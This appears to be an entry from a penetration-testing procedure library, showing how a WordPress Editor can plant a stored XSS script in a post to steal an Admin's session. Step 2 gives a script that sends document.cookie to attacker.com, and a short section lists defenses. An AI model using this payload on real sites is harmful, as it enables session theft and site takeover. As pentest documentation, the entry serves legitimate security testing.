---
tags:
  - wordpress
  - stored-xss
  - javascript
  - privilege-escalation
type: procedure
tools: []
tactics:
  - '[[Privilege Escalation]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:29:44.821Z'
sub_techniques: []
id: ab507c55-8050-4cca-887d-2b2fdc456b89
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Create-Stored-XSS-Post-for-Admin-Escalation

## Summary

This procedure injects a JavaScript payload into a WordPress post as an Editor, exploiting Stored XSS to steal Admin session data or perform unauthorized actions when viewed by an Admin.

## Description

Editors possess the unfiltered_html capability, allowing raw JS insertion without sanitization. The payload can exfiltrate cookies or submit forms to escalate to Admin (e.g., by hijacking sessions). Targets post content stored in wp_posts table. When an Admin views the post, the XSS triggers, enabling full takeover. Prerequisites: Editor session and knowledge of a suitable payload.

## Requirements

1. Active Editor admin session
2. JavaScript payload (e.g., for cookie theft)
3. Access to Posts creation interface

## Defense

Defensive measures and detection strategies:

- Disable unfiltered_html for non-Admin roles via plugins or code
- Sanitize post content with WordPress filters (e.g., wp_kses)
- Scan for JS in posts using security tools like Wordfence

## Objectives

1. Inject persistent XSS payload
2. Trigger execution on Admin interaction
3. Achieve Admin privilege escalation

## Instructions

### Step 1: Create New Post

**Context**: Prepare a post for payload insertion.

Go to Posts > Add New in the dashboard.

> Opens the post editor interface.

### Step 2: Insert Payload

**Context**: Embed JavaScript in content.

Switch to Text/HTML view and add `<script>fetch('http://attacker.com/steal?data='+btoa(document.cookie));</script>`, then publish.

> Post saves with raw script; visible to all users including Admins.

### Step 3: Induce Admin View

**Context**: Ensure payload execution.

Share the post link with Admin or wait for dashboard review.

> On view, script runs in Admin's browser context.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]] Privilege Escalation

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- wordpress
- xss
- javascript
